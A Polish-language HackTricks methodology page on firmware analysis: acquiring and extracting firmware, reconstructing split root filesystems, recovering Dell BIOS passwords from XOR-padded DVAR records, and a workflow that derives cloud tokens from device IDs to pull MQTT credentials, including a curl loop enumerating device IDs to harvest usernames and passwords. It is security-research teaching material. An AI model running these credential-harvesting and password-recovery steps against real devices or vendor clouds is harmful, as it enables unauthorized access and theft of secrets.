# Analiza firmware’u

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane materiały

Informacje o pozyskiwaniu danych z dostępnych interfejsów sprzętowych znajdziesz w artykułach [Zrzucanie firmware’u za pomocą konsoli UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) oraz [Zrzucanie zawartości pamięci SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Informacje o powtarzalnym przechwytywaniu danych UART podczas uruchamiania, przed uzyskaniem dostępu do konsoli, znajdziesz w artykule [Zasilanie sterowane przez SCPI i akwizycja danych z oscyloskopu](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownik wchodzi w interakcję. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może korzystać z kluczowych instrukcji od chwili włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware’u i jego potencjalna modyfikacja to kluczowe kroki w identyfikowaniu luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy krok w poznaniu budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje gromadzenie danych o:

- architekturze procesora i uruchomionym na nim systemie operacyjnym
- szczegółach dotyczących bootloadera
- układzie sprzętowym i dokumentacji technicznej
- metrykach bazy kodu i lokalizacji kodu źródłowego
- bibliotekach zewnętrznych i typach licencji
- historii aktualizacji i certyfikatach regulacyjnych
- diagramach architektury i przepływu
- ocenach bezpieczeństwa i zidentyfikowanych lukach

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, a także analiza dostępnych komponentów oprogramowania open source z wykorzystaniem ręcznych i zautomatyzowanych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, która może pomóc w wykrywaniu potencjalnych problemów.

## **Pozyskiwanie firmware’u**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od deweloperów lub producentów)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron pomocy technicznej
- Korzystając z zapytań **Google dork**, aby znaleźć hostowane pliki firmware’u
- Uzyskując bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Pozyskując** je z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Wykrywając i używając **zakodowanych na stałe endpointów aktualizacji**
- **Zrzucając** firmware z bootloadera lub przez sieć
- **Wyjmując i odczytując** układ pamięci, gdy inne metody zawiodą, za pomocą odpowiednich narzędzi sprzętowych

### Logi dostępne tylko przez UART: wymuszenie powłoki root przez zmienne środowiskowe U-Boot w pamięci flash

Jeśli UART RX jest ignorowany (dostępne są tylko logi), nadal można wymusić uruchomienie powłoki init, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla bloba.
3. Zapisz ponownie tylko partycję env i uruchom urządzenie ponownie; na UART powinien pojawić się shell.

Jest to przydatne w urządzeniach wbudowanych, w których shell bootloadera jest wyłączony, ale partycja env jest zapisywalna przez zewnętrzny dostęp do flasha.

## Analiza firmware’u

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz do tego użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi niewiele znajdziesz, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`. Niska entropia oznacza, że obraz raczej nie jest zaszyfrowany. Wysoka entropia sugeruje, że jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi do wyodrębnienia **plików osadzonych w firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby przeanalizować plik.

### Surowe zasoby wyświetlacza w zewnętrznej pamięci flash

Zrzut zewnętrznej pamięci SPI nie musi zawierać wykonywalnego firmware układu MCU. W przypadku układu Cortex-M porównaj początek każdego potencjalnego obszaru kodu z mapą pamięci urządzenia: typowa tabela wektorów zaczyna się od prawdopodobnego wskaźnika stosu SRAM i adresu procedury obsługi resetu w pamięci wykonywalnej. Sam brak tabeli wektorów pod offsetem zero nie dowodzi, że cały układ nie zawiera kodu; sprawdź też inne offsety i mechanizm rozruchu. Jeśli `binwalk` nie wykryje kontenera, przeanalizuj surowe bajty i powiąż adresy odczytu pamięci flash z [zdekodowanego przechwycenia SPI](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) z działaniami, które ładują nowe ekrany.<sup>[[14]](#references)</sup>

W przypadku obszaru zawierającego zasoby wyświetlacza sprawdź różne formaty pikseli i wymiary, zamiast zakładać, że są to pliki PNG/JPEG. W opisanym urządzeniu użyto klatek **80×160 RGB565 little-endian**: przy dwóch bajtach na piksel klatka zajmuje **25 600 bajtów** (25 KiB), a nie 24 kilobity. Adres odczytu pamięci flash pozwolił ustalić offset zasobu ekranu; badacz przekonwertował przygotowany obraz poleceniem `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zastąpił zasób o tej samej wielkości w oryginalnym zrzucie, zapisał go poleceniem `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potwierdził wyświetlenie nowego obrazu. Dowodzi to, że *zewnętrzne zasoby wyświetlacza* można zapisywać, a nie że można wyodrębnić lub ponownie wgrać wewnętrzny firmware układu MCU. Przed zapisem zachowaj oryginalny zrzut i sprawdź wymiary, kolejność bajtów, offset oraz długość zastępowanych danych.<sup>[[14]](#references)</sup>

### Różnicowa analiza pamięci flash i odzyskiwalne magazyny sekretów XOR

Jeśli format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka zgodnych odczytów pamięci flash, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj cały układ i porównaj offsety. Powtórzenie eksperymentu z kontrolowanymi wartościami pozwala odróżnić dane ustawienia od liczników i metadanych zapisu; zmiany pod nowymi offsetami zamiast w miejscu wskazują na magazyn tylko do dopisywania lub o strukturze dziennika. Zachowaj wpisy oznaczone jako usunięte (tombstone), ponieważ ich bajty danych mogą być nadal możliwe do odzyskania.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware'u za pomocą narzędzi takich jak `binwalk` i przeanalizuj w Ghidrze funkcję zapisującą/walidującą. Potwierdź w kodzie granice pól, padding, indeksowanie klucza i wyprowadzanie klucza, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców w ciphertext.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego paddingu zerowego

Jak opisano w [szyfrowaniu opartym na XOR](../../crypto/symmetric/#xor-based-encryption), znany tekst jawny ujawnia bajty keystreamu na tych samych offsetach. Stałej długości pole jest szczególnie podatne, gdy jego padding zerowy obejmuje wszystkie indeksy powtarzającego się klucza XOR: zaszyfrowany padding ujawnia te bajty klucza bezpośrednio, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli pokryty jest każdy indeks klucza, odtwórz klucz z końcowej części ciphertext i odszyfruj wypełnione bajty.<sup>[[12]](#references)</sup>

Podatny format hasła BIOS-u DVAR firmy Dell jest konkretnym przykładem: bajt `0` pola o długości 32 bajtów jest tekstem jawnym, a bajty `1..31` używają powtarzającego się klucza o długości 20 bajtów.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały wartość zero przed operacją XOR. Gdy `L <= 12`, te pozycje obejmują każdy indeks klucza, więc cały klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Odzyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest w przybliżeniu wyprowadzany jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jego pierwszy bajt w postaci jawnej. Daje to maksymalnie 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Pogrupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może ujawnić pełny klucz przez dopełnienie i pozwolić odszyfrować bieżący, dłuższy rekord, którego własne dopełnienie jest niewystarczające. Rotacja hasła może więc zwiększyć narażenie, gdy stary szyfrogram zostaje oznaczony jako usunięty zamiast wymazany.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje kandydatów na rekordy, odzyskuje hasła i może wyświetlać surowe bajty danych przechowywanych i klucza. Zbuduj je z checkoutu i przeskanuj zweryfikowany obraz flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku własnych parserów odrzucaj fałszywe trafienia, sprawdzając strukturę rekordów, ograniczenia dotyczące znaków drukowalnych, dopełnienie zerami, entropię klucza oraz spójność w miejscu zawijania klucza. Jeśli powtarzane zrzuty pokazują rzadkie zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj możliwe korekty według tych ograniczeń, ale zamiast przedstawiać wynik heurystyczny jako dokładne odzyskanie danych, oznacz niejednoznaczne znaki.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany hash jednokierunkowy zamiast odwracalnego szyfrogramu, a magazyny o strukturze dziennika powinny bezpiecznie usuwać nieaktualne materiały poufne.<sup>[[12]](#references)</sup>

### Uzyskiwanie systemu plików

Za pomocą wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu o nazwie odpowiadającej typowi systemu plików**, którym najczęściej jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma sygnatury bajtów magicznych danego systemu plików**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyodrębnić skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików odpowiednio do jego typu, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom poniższe **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych systemów plików root w urządzeniach wbudowanych

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie uznawaj go od razu za uszkodzony. Kod rozruchowy urządzenia wbudowanego może złożyć rzeczywiste urządzenie root z wielu fizycznych zakresów za pomocą Device Mapper, więc wyodrębnienie danych z jednej partycji GPT daje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza pełnego obrazu nośnika

Najpierw sprawdź, czy pozyskiwanie danych zostało zakończone, rozmiar obrazu jest stabilny i żaden proces nie zapisuje już do tego obrazu. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odzyskaj GPT w trybie tylko do odczytu i podłącz tylko wymagany zakres; **nie** uruchamiaj `vgchange -ay` dla niezaufanego woluminu fizycznego na stacji roboczej, ponieważ może to spowodować kolizje grup woluminów i niezamierzone zapisy.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferuj jednorazową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi widzieć cały obraz. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zapisać przesunięcia w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić osadzoną linię poleceń, kernel i initramfs, a następnie niezależnie zweryfikuj każdy wynik za pomocą `file`, bajtów sygnatury i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć initrd, obiekt ACPI lub podpis do kernela.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków używaną podczas rozruchu

Wyodrębnij initramfs kernela i przeprowadź inżynierię wsteczną jego `/init` oraz wszystkich bibliotek pamięci masowej. W [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) śledź odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji; następnie prześledź kod wybierający aktywny slot A/B i tworzący tabelę. Przydatne punkty startowe w radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel `linear` mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń zaplecza. Odtworzona tabela z dwoma segmentami ma zwykle następującą postać (wszystkie pozycje i długości podano w sektorach po 512 bajtów):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz dokładnie arytmetykę kodu maszynowego, w tym szerokość liczb całkowitych, przesunięcia bitowe i konwersje jednostek. Na przykład poniższe wyrażenie zaokrągla rozmiar w bajtach w dół do granicy 4 KiB, a dopiero potem przelicza go na sektory po 512 bajtów; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany koniec o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do rozmiaru strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz analityczny, kopiując zakresy w kolejności tabeli, w ograniczonych fragmentach zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mappera po stronie hosta. Zachowaj offsety wyznaczone na podstawie GPT, odwrócone liczby sektorów i wynikową długość danych jako osobne asercje.<sup>[[9]](#references)</sup>

#### Odróżnij uszkodzenie od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź magiczne `hsqs` i odczytaj little-endian 64-bitowe pole `bytes_used` z offsetu 40 superbloku, zanim uruchomisz `unsquashfs`. Jeśli ekstrakcja kończy się niepowodzeniem w kilku niezwiązanych ze sobą strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj silnych kandydatów strukturalnych: bloku metadanych, który można zdekompresować, kilku kolejnych prawidłowych wpisów katalogu, wiarygodnych pól inode, inode katalogu głównego zgodnego z liczbą inode lub prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie magicznej wartości nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama delta ze znakiem sprawia, że niezależne struktury stają się poprawne — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i poszukaj odrzuconych reszt z dzielenia, problemów ze znakiem, przepełnienia lub zaokrąglania do granic sektorów/stron, zanim podejmiesz próbę odzyskiwania osieroconych danych lub modyfikowania metadanych systemu plików.<sup>[[9]](#references)</sup>

Na koniec rozdziel granice ochrony: woluminy LUKS z kluczem zapieczętowanym w TPM chronią poufność danych, natomiast podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie odzyska klucza zapieczętowanego w oryginalnym fizycznym TPM, a uruchomienie zmodyfikowanego SquashFS za pomocą init przeznaczonego wyłącznie do badań, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware'u

Po uzyskaniu firmware'u należy go przeanalizować, aby zrozumieć jego strukturę i potencjalne luki. Proces ten polega na użyciu różnych narzędzi do analizy i wyodrębnienia przydatnych danych z obrazu firmware'u.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz poznać szczegóły partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić, czy obraz jest zaszyfrowany, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do **odzyskiwania osadzonych plików** zaleca się narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zazwyczaj wyodrębnić system plików, często do katalogu nazwanego zgodnie z jego typem (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów sygnatury, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do znalezienia przesunięcia systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Później, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, endpointy API, funkcje serwera aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** — dane uwierzytelniające użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

Kilka narzędzi pomaga wykrywać poufne informacje i luki w zabezpieczeniach systemu plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych na podstawie danych

Wiele hubów IoT pobiera konfigurację dla poszczególnych urządzeń z endpointu chmurowego o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że wartość `<token>` jest lokalnie wyliczana na podstawie identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i zapisany jako wielkie znaki szesnastkowe

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL-a i pobranie konfiguracji chmurowej, która często ujawnia dane uwierzytelniające MQTT w postaci jawnej oraz prefiksy tematów.

Praktyczny przebieg pracy:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj linii wyświetlających wzorzec adresu URL konfiguracji chmury i adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Wczytaj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bash i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Zbierz konfigurację chmury i dane uwierzytelniające MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystaj MQTT przesyłający dane jawnym tekstem i słabe ACL-e tematów (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby zasubskrybować tematy konserwacyjne i wyszukać poufne zdarzenia:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów umieszcza bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz programowo iterować po kandydujących identyfikatorach, wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Uwagi
- Zawsze uzyskaj wyraźną zgodę przed rozpoczęciem masowej enumeracji.
- Jeśli to możliwe, odzyskuj sekrety za pomocą emulacji lub analizy statycznej, zamiast modyfikować sprzęt docelowy.


Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, albo na gotową maszynę wirtualną, może ułatwić dalsze testowanie.

### Emulacja pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest ustalenie kolejności bajtów i architektury CPU programu.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

Aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Dla MIPS (big-endian) używa się `qemu-mips`, a dla plików binarnych little-endian — `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku plików binarnych ARM proces jest podobny: do emulacji używa się emulatora `qemu-arm`.

### Emulacja całego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają emulację całego firmware'u, automatyzują ten proces i pomagają w analizie dynamicznej.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root na potrzeby emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia inode'ów, katalogów lub tablicy fragmentów są niemożliwe do ustalenia, nie modyfikuj od razu `unsquashfs`. Przeanalizuj binarny plik wczesnego etapu rozruchu i odtwórz tworzony przez niego graf urządzeń blokowych: systemy wbudowane mogą udostępniać nominalną partycję root, ale tworzyć właściwy system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Kontrole obejmujące wyłącznie superblok mogą się powieść, nawet jeśli wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[11]](#references)</sup>

Odtwórz dokładnie obliczenia wykonywane przez firmware. Ustal w szczególności, czy długości są wyrażone w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; zachowaj pierwotną kolejność operacji przesunięcia bitowego i obcięcia; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych. Zastąpienie tego wyrażenia przez `partition_bytes // 512` może przesunąć dołączany obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tablice SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces weryfikacji wygląda następująco:<sup>[[11]](#references)</sup>

1. Odczytaj z pliku binarnego weryfikatora/init urządzenie źródłowe, początkowy sektor i długość każdego segmentu `dm-linear`.
2. Połącz obszary lub zmapuj je, nie zmieniając zasad wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych prawidłowych struktur metadanych, zamiast uznawać za wystarczający sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowany `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje kernel QEMU, initramfs i dyski wirtualne, można uruchomić zmodyfikowany system root, zastępując weryfikujący proces PID 1 dostawcy niewielkim, statycznie linkowanym init. To **laboratoryjne zastąpienie łańcucha rozruchowego**, a nie obejście dm-verity, jego podpisu RSA, Secure Boot ani klucza zabezpieczonego przez TPM.<sup>[[11]](#references)</sup>

